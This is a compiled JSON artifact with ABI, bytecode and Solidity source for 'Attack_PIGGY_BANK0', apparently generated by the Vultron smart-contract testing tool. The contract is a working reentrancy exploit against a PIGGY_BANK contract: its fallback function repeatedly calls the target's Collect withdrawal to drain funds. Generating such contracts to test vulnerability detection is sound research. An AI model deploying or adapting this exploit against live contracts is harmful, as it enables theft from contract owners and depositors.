{
  "contractName": "Attack_PIGGY_BANK0",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "target_contract",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "name": "_targetContract",
          "type": "address"
        }
      ],
      "payable": true,
      "stateMutability": "payable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "vultron_amount",
          "type": "uint256"
        },
        {
          "name": "to",
          "type": "address"
        }
      ],
      "name": "vultron_Put",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "vultron_amount",
          "type": "uint256"
        },
        {
          "name": "_am",
          "type": "uint256"
        }
      ],
      "name": "vultron_Collect",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405260405160208061041183398101806040528101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061039b806100766000396000f300608060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806318b5060714610103578063574ffc311461012d578063c474e3d214610184575b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633fe438226127106040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b1580156100e957600080fd5b505af11580156100fd573d6000803e3d6000fd5b50505050005b61012b60048036038101908080359060200190929190803590602001909291905050506101c4565b005b34801561013957600080fd5b50610142610271565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6101c260048036038101908080359060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610296565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633fe4382283836040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808281526020019150506000604051808303818588803b15801561025457600080fd5b505af1158015610268573d6000803e3d6000fd5b50505050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e5b5fe7283836040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019150506000604051808303818588803b15801561035257600080fd5b505af1158015610366573d6000803e3d6000fd5b505050505050505600a165627a7a72305820a609b663416bbf61f752e8cc13eb0965e194d0b5d737ed7d8a0380b5472c04f50029",
  "source": "pragma solidity ^0.4.19;\n\nimport \"/home/liuye/Webank/vultron/contracts/PIGGY_BANK.sol\";\n\ncontract Attack_PIGGY_BANK0 {\n\n  PIGGY_BANK public target_contract;\n\n  function Attack_PIGGY_BANK0(address _targetContract) public payable {\n      target_contract = PIGGY_BANK(_targetContract);\n  } \n\n  function vultron_Put(uint256 vultron_amount, address to) public payable{\n    target_contract.Put.value(vultron_amount)(to);\n  } \n\n  function vultron_Collect(uint256 vultron_amount, uint256 _am) public payable{\n    target_contract.Collect.value(vultron_amount)(_am);\n  } \n\n      function() public payable {\n        \n        target_contract.Collect(10000);\n      }\n      } \n",
  "sourcePath": "/home/liuye/Webank/vultron/contracts/Attack_PIGGY_BANK0.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.26+commit.4563c3fc.Emscripten.clang"
  },
  "schemaVersion": "2.0.0",
  "updatedAt": "2020-05-01T07:32:40.477Z"
}